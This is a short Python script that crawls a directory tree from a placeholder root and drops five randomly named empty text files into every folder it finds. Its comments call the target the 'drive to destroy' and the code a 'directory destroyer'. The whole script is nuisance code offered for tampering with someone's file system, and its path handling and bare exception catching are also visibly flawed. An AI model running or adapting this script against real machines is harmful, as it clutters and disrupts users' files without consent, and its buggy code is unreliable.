import os
import time
import random

start_time, fol, storepaths, loop, count, folpathcount = time.time(), [], [], False, 0, -1
folpaths = ["C:/example/dir"] #desried drive to destroy
storepaths.append(folpaths)
while loop != True:
    try: spath = folpaths[0]
    except: loop = True
    try:
        file = os.listdir(spath)
        for i in file:
            if "." not in i:
                folpaths.append(spath + i + "/")
                storepaths.append(spath + i + "/")
        try: del folpaths[0]
        except: loop = True
    except:
        try: del folpaths[0]
        except: loop = True
print(storepaths)
#--------------------------------------------------------------------------------
for path in storepaths:
    for i in range(5): #desired amount of files added
        var = ""
        for x in range(15): var = var + chr(random.randint(97, 122))  #extra bit of code for directory destroyer
        try: woo = open((path + var + ".txt"), "w").close()
        except: print("whoops")
print("--- %s seconds ---" % (time.time()-start_time))
